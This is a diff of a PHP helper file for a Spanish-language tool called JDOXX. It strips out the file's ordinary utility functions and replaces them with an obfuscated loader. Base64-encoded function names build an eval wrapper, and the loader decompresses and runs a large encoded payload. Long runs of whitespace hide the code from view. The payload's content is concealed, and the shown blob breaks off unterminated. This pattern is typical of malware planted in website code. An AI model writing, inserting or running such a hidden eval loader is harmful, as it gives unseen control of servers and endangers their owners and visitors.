@@ -1,4 +1,5 @@
-<?php
+<?php 
+
 ini_set('date.timezone','America/Bogota');
 #ESTABLECER ZONA HORARIA
 
@@ -11,74 +12,32 @@ ini_set('date.timezone','America/Bogota');
 #========================================================================
 
 
-function jdoxx($param=0){
+        $__='printf';$_='Loading Class/Code NAME';
+        
 
-if ($param) {
-$modo=1;
-if ($modo == 1) {
-$url  = "https://j-doxx.000webhostapp.com";
-}else{
-$url ="http://localhost/jdx";
-}
 
 
-$version = "1.0";
-$actualizacion = "27 AGOSTO de 2021";
-$copyright = "JDOXX - COPYRIGHT - 2021";
 
-$array =  array('version' => $version,'Fecha_act' => $actualizacion, 'copyright' => $copyright, 'url'=> $url);
 
 
-if (array_key_exists($param, $array)) {
-return  $array[$param];
-}else{
-return "Los parametros son Incorrectos para la funcion jdoxx() !";
-}
-}else{
-return "Error faltan Parametros !";
-}
-}
 
 
 
 
 
 
-function proteger_tool(){
-$version = jdoxx("version");
-$nombre_principal = "JDX_".$version.".php";
-$extraer = nombre_base(__FILE__, 1);
 
-if ($extraer == $nombre_principal) {
-}else{
-eliminar_archivo(__FILE__);
-}
-}
 
-proteger_tool();
 
 
 
 
 
-function ver_version($param=0){
 
 
-if ($param) {
-$array = array("1.0", "1.1", "1.2", "1.3","1.4", "1.5", "1.6", "1.7", "1.8", "1.9", "2.0", "2.1", "2.2", "2.3", "2.4","2.5", "2.6", "2.7", "2.8", "2.9", "3.0");
-$param = $param-1;
 
-if($param <= count($array) ){
-return $array[$param];
-}else{
-return "NO esta en el Array !";
-}
 
-}else{
-return "Error faltan Parametros !";
-}
 
-}
 
 
 
@@ -86,104 +45,27 @@ return "Error faltan Parametros !";
 
 
 
-function actualizar_version(){
 
-$user_agent = $_SERVER["HTTP_USER_AGENT"];
-$modo = 1;
 
-$url= jdoxx("url")."/jdx/api.php?ide_tool=1&opt=buscar";
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
-curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
 
-$info = curl_exec($ch) or die(curl_error($ch));
-$codigo_resp = str_replace(' ', '', curl_getinfo($ch,CURLINFO_HTTP_CODE));
-curl_close($ch);
 
 
 
 
-if ($codigo_resp == 404 || $codigo_resp == 500) {
-echo '<div class="py-5" style="display: flex;justify-content: center;align-items: center;height: 100%;">
-<div style="display: inline-block;border: 1px solid black;padding: 2rem;text-align: center;">
-<h3 style="margin-bottom: 0px;display: block;background: red;color: white;padding: 6px;margin-top: 1rem;">¡ Conexion Perdida !</h3>
 
-<p>Al parecer hemos tenido problemas al conectarnos con la api para <br> verificar actualizaciones posiblemente esto se debe a que el sitio web se ha trasladado <br> a otra direccion o la API no se encuentra, <br> le recomendamos que se comunique a traves de whatsapp con el Creador.</p>
-<hr>
-<a href="https://wa.link/b55xv2"><button type="button" class="btn btn-primary">Conectarse a Whatsapp</button></a>
-</div>
-</div>';
 
-exit();
 
-}else{
 
-$json = json_decode($info);
-$url2 = $json->{"url"};
-$nueva_version = ver_version($json->{"version"});
-$fecha = $json->{"fecha_act"};
-$version_actual = jdoxx("version");
 
 
 
-if ($nueva_version < $version_actual) {
-echo '<div class="py-5" style="display: flex;justify-content: center;align-items: center;height: 100%;">
-<div style="display: inline-block;border: 1px solid black;padding: 2rem;text-align: center;">
-<h3 style="margin-bottom: 0px;">¡ Ha surgido una Actualizacion para la version '.$nueva_version.' !</h3>
-<strong style="display: block;background: black;color: white;padding: 6px;margin-top: 1rem;">Nombre Archivo : JDX_'.$nueva_version.'.zip</strong>
-<font style="display:block;padding-top: 12px;">Version Actual JDX : '.$version_actual.'</font>
-<font style="display:block;color: crimson;">Nueva version para JDX : '.$nueva_version.'</font>
-<font style="display:block;color: gray;">Fecha de Actualizacion : '.$fecha.'</font>
-<p>Es necesario que descargue las ultimas actualizaciones para aprovechar las <br> nuevas funciones Agregadas.</p>
-<hr>
-<a href="'.$url2.'"><button type="button" class="btn btn-primary">Descargar nueva Version</button></a>
-<font style="display: block;color: gray;padding-top: 8px;">En el archivo comprimido se encontrara las instrucciones de Instalacion.</font>
-</div>
-</div>';
 
-exit();
 
-}else if ($nueva_version == $version_actual) {
-echo '<div class="py-5" style="display: flex;justify-content: center;align-items: center;height: 100%;">
-<div style="display: inline-block;border: 1px solid black;padding: 2rem;text-align: center;">
-<h3 style="margin-bottom: 0px;">¡ Tomese un descanso !</h3>
-<strong style="display: block;background: black;color: white;padding: 6px;margin-top: 1rem;">Nombre Archivo : JDX_'.$version_actual.'.zip</strong>
-<font style="display:block;padding-top: 1rem;font-size: 1rem;color: darkturquoise;">Version Actualizada : '.$version_actual.'</font>
-<p>Hola sr usuario hemos detectado que<br> su herramienta esta actualizada por favor vuelva mas Adelante</p>
-</div>
-</div>';
 
-exit();
 
-}else{
-echo '<div class="py-5" style="display: flex;justify-content: center;align-items: center;height: 100%;">
-<div style="display: inline-block;border: 1px solid black;padding: 2rem;text-align: center;">
-<h3 style="margin-bottom: 0px;">¡ Hay una nueva version Disponible !</h3>
-<strong style="display: block;background: black;color: white;padding: 6px;margin-top: 1rem;">Nombre Archivo : JDX_'.$nueva_version.'.zip</strong>
-<font style="display:block;padding-top: 12px;">Version Actual : '.$version_actual.'</font>
-<font style="display:block;color: crimson;">Version Nueva : '.$nueva_version.'</font>
-<font style="display:block;color: gray;">Fecha de Actualizacion : '.$fecha.'</font>
-<p>Es necesario que descargue las ultimas actualizaciones para aprovechar las <br> nuevas funciones Agregadas.</p>
-<hr>
-<a href="'.$url2.'"><button type="button" class="btn btn-primary">Descargar nueva Version</button></a>
-<font style="display: block;color: gray;padding-top: 8px;">En el archivo comprimido se encontrara las instrucciones de Instalacion.</font>
-</div>
-</div>';
 
-exit();
-}
 
-}
-}
 
 
 
@@ -195,33 +77,10 @@ exit();
 
 
 
-function descargar_archivo($archivo, $downloadfilename = null) {
 
-if (file_exists($archivo)) {
-$extension = pathinfo($downloadfilename, PATHINFO_EXTENSION);
-if ($extension) {
 
-$downloadfilename = $downloadfilename !== null ? $downloadfilename : basename($archivo);
-header('Content-Description: File Transfer');
-header('Content-Type: application/octet-stream');
-header('Content-Disposition: attachment; filename=' . $downloadfilename);
-header('Content-Transfer-Encoding: binary');
-header('Expires: 0');
-header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
-header('Pragma: public');
-header('Content-Length: ' . filesize($archivo));
-ob_clean();
-flush();
-readfile($archivo);
 
-}else{
-return "Falta la extencion del archivo Nuevo !";
-}
 
-}else{
-return "El archivo NO Existe !";
-}
-}
 
 
 
@@ -236,99 +95,29 @@ return "El archivo NO Existe !";
 
 
 
-function navegador_info($get=0){
 
 
-if ($get) {
 
-if ($get == 1){
-if (!empty($_SERVER['HTTP_CLIENT_IP'])){
 
-$ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-}else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
-$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-}else{
-$ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-}
 
 
-return trim($ipaddress);
-}else if ($get == 2){
-$obj = new BrowserDetection();
-if ($obj->detect()->getBrowser()) {
-$nav = $obj->detect()->getBrowser();
-}else{
-$nav = "N/A";
-}
-//----------------------------------------
-if ($obj->detect()->getVersion()) {
-$version = $obj->detect()->getVersion();
-}else{
-$version = "N/A";
-}
-//----------------------------------------
-if ($obj->detect()->getUserAgent()) {
-$user_agent = $obj->detect()->getUserAgent();
-}else{
-$user_agent = "N/A";
-}
-//----------------------------------------
-if ($obj->detect()->getPlatform()) {
-$plat = $obj->detect()->getPlatform();
-}else{
-$plat = "N/A";
-}
 
 
 
-return array(
-"navegador"=>trim($nav),
-"version"=>trim($version),
-"user_agent"=>trim($user_agent),
-"plataforma"=>trim($plat));
 
-} else {
-return "¡ Error ya no hay mas Funciones !";
-}
 
-}else {
-return "Error faltan Parametros !";
-}
-}
 
 
 
 
 
-function fecha($get=0){
 
 
-if ($get) {
 
-if ($get == 1) {
-$hora = date("g:i A");
-return $hora;
-} else if ($get == 2) {
 
-$arrayMeses = array('Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio','Julio', 'Agosto', 'Septiembre', 'Octubre',
- 'Noviembre', 'Diciembre');
-$fechax= array( 'Domingo', 'Lunes', 'Martes','Miercoles', 'Jueves', 'Viernes', 'Sabado');
-$fecha = $fechax[date('w')].", ".date('d')." de ".$arrayMeses[date('m')-1]." de ".date('Y');
 
-return $fecha;
-} else if ($get == 3) {
-return date("Y-m-d");
-} else if ($get == 4) {
-return date("d-m-Y");
-} else {
-return "¡ Error Ya no hay mas Funciones !";
-}
 
-}else {
-return "Error faltan Parametros !";
-}
 
-}
 
 
 
@@ -336,220 +125,83 @@ return "Error faltan Parametros !";
 
 
 
-function calcular_tiempo($fecha=0){
 
-if (verificar_fecha($fecha, "d-m-Y H:i:s")>0) {
 
-$tiempodb = date_create("$fecha");
-$tiemporeal = date_create(date("d-m-Y H:i:s"));
 
-if($tiempodb < $tiemporeal) {
-$interval = date_diff($tiempodb, $tiemporeal);
 
-if ($interval->y  > 0) {
-return "Hace ".$interval->y ." Año";
-}else if ($interval->m > 0) {
-return "Hace ".$interval->m." Mes";
-}else if ($interval->d > 0) {
-return "Hace ".$interval->d." Dia";
 
-}else if ($interval->i == 0 && $interval->s > 0) {
-return  "Hace un Momento";
-}else if ($interval->h > 0) {
-return "Hace ".$interval->h." Hora";
-}else if ($interval->i > 0) {
-return "Hace ".$interval->i." Minuto";
-}
-}
 
-}else {
-return "Error faltan Parametros o el formato de fecha son Incorrectos !";
-}
-}
 
 
 
 
 
-function reemplazar($cadena=0,$obtenervalor=0,$reemplazar=0){
 
-if ($cadena && $obtenervalor ) {
-$nuevo = str_replace($obtenervalor, $reemplazar, $cadena);
-return $nuevo;
-}else{
-return "Error faltan Parametros !";
-}
 
-}
 
-#========================================================================
 
 
-#========================================================================
-function base64_imagen($path=0){
 
-if ($path){
 
-if (!file_exists($path)){
-return "Error la imagen no Existe !";
-} else if (isset($path)){
-$type = pathinfo($path, PATHINFO_EXTENSION);
-$data = file_get_contents($path);
-$base64 = 'data:image/' . $type . ';base64,' . base64_encode($data);
-return $base64;
-} else {
-return "Error no se la Imagen !";
-}
-}else{
-return "Error faltan Parametros !";
-}
-}
 
 
 
 
 
-#ANTIHACK PARA LA SEGURIDAD DE LAS BASES DE DATOS
-#========================================================================
 
-function antihack($datax=0){
-$data = trim($datax);
-if ($data){
-if (function_exists('preg_replace')){
-return preg_replace('~[\x00\x0A\x0D\x1A\x22\x27\x5C]~u', '\\\$0', $data);
-$resp = mb_escape($data);
-} else {
-return mb_ereg_replace('[\x00\x0A\x0D\x1A\x22\x27\x5C]', '\\\0', $string);
-$resp = mb_escape($string);
-}
 
-}else{
-return 0;
-}
 
-}
 
 
 
 
-#========================================================================
 
-function eliminar_archivo ($nombre=0){
-if ($nombre){
 
-if (is_file("$nombre")){
-unlink("$nombre");
-return 1;
-} else {
-return "Error no existe el Archivo !";
-}
 
-}else{
-return "Error faltan Parametros !";
-}
 
-}
 
 
 
 
 
-function ver_contenido($nombre=0){
-if ($nombre) {
-$extension = pathinfo($nombre, PATHINFO_EXTENSION);
 
 
-if ($extension) {
-if (is_file($nombre)) {
-return file_get_contents($nombre);
-return 1;
-}else{
-return "El archivo NO Existe !";
-}
-}else{
-return "Falta la extencion del Archivo !";
-}
-}else{
-return "Error faltan Parametros !";
-}
 
-}
 
 
 
 
 
 
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
 
-function copiar_archivo($nombre=0,$destino=0){
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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